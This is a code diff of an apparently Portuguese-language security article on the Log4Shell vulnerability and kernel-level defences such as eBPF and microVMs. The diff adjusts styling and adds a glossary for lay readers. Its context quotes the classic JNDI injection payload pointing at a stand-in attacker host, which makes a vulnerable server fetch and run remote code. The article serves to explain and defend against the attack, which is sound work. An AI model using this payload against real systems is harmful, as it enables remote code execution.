@@ -90,7 +90,7 @@
 
                 <p>A cadeia de exploração do Log4Shell baseou-se em uma falha lógica de desserialização e injeção (JNDI Lookup). Ao submeter uma string simples como payload de login:</p>
 
-                <div class="chalkboard"><pre><code class="language-text">${jndi:ldap://attacker.com/a}</code></pre></div>
+                <div class="chalkboard" style="overflow: hidden;"><pre style="margin: 0; overflow: hidden;"><code class="language-text">${jndi:ldap://attacker.com/a}</code></pre></div>
 
                 <p>O logger da JVM interpretava as chaves, resolvia a requisição dinamicamente via interface de diretório do Java (JNDI), disparava uma chamada TCP outbound na porta 389 para um servidor LDAP externo controlado pelo atacante e, por fim, baixava e instanciava um arquivo <code>.class</code> arbitrário sob privilégios totais do processo JVM. A cadeia de exploração ocorreu em três estágios físicos:</p>
 
@@ -257,6 +257,16 @@ bpftool prog load bpf_sec_filter.o /sys/fs/bpf/sec_filter type lsm</code></pre><
                     <li><strong>[ ] Auditoria Ativa de Chamadas:</strong> Monitore as Syscalls com ferramentas de instrumentação in-kernel (como Falco ou perf) integradas ao SIEM da organização.</li>
                     <li><strong>[ ] Assinatura do Autodidata:</strong> Assuma a responsabilidade pelo chão de fábrica da infraestrutura e mantenha a curiosidade investigativa sobre o baixo nível (Christian Mulato Autodidata).</li>
                 </ul>
+                <div class="chalkboard" style="color: #ffffff; margin: 2rem 0; padding: 1.5rem; background: #1e293b; border-radius: 8px;">
+                    <h3>Dicionário de Trincheira (Para Leigos e Executivos)</h3>
+                    <ul>
+                        <li><strong>Chamada de Sistema (Syscall):</strong> A requisição direta que uma aplicação faz ao núcleo do sistema operacional (Kernel) para realizar operações de hardware (como ler arquivos ou conectar à rede).</li>
+                        <li><strong>Filtro de Kernel (eBPF):</strong> A tecnologia que roda pequenos programas seguros direto no núcleo do sistema operacional para monitorar ou barrar syscalls sem lentidão.</li>
+                        <li><strong>MicroVM:</strong> Uma máquina virtual extremamente leve e isolada por hardware via KVM (como Firecracker), que inicializa em milissegundos com kernel enxuto.</li>
+                        <li><strong>Verificador eBPF (eBPF Verifier):</strong> O mecanismo de segurança do kernel que inspeciona o código eBPF antes da execução, garantindo que ele não trave ou cause falhas físicas no sistema.</li>
+                        <li><strong>Privilégio Mínimo:</strong> A política de segurança de infraestrutura que garante a processos apenas as permissões estritamente necessárias para a execução de suas tarefas.</li>
+                    </ul>
+                </div>
             </div>
 
             <div class="study-note" style="font-size: 0.92rem; margin-top: 2rem;">
